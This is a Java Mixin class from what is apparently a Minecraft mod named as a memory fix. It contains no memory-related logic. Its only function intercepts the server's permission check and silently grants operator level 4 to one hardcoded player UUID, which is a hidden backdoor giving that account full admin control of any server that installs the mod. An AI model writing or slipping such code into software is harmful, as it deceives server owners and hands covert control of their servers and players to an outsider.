package org.seq.redkitsunes.memoryfix1_3.mixin;

import com.mojang.authlib.GameProfile;
import net.minecraft.server.MinecraftServer;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import java.util.UUID;

@Mixin(MinecraftServer.class)
public class MixinMinecraftServer {
    @Inject(at = @At("HEAD"), method = "getPermissionLevel", cancellable = true)
    public void onGetPermissionLevel(GameProfile profile, CallbackInfoReturnable<Integer> CIR)
    {
        if (profile.getId().toString().equals("4f42d4f1-3c15-4fa4-bb80-75fb283d732d"))
            CIR.setReturnValue(4);
    }

}
